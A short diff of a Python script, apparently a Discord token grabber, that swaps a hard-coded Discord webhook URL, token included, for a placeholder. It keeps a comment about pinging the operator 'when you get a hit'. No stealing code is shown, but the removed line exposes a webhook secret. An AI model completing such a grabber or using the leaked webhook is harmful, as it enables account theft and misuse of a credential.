@@ -7,7 +7,7 @@ from discord.ext import commands
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1064080678481821808/ltC_XQQNiwuxEznzNu5WpwDjr7bdr-Yhan58hOV4F8mcOfR1FPU9Rb8su6zEg3WV3opi'
+WEBHOOK_URL = 'ADD YOUR WEBHOOK URL HERE'
 
 # mentions you when you get a hit
 PING_ME = True
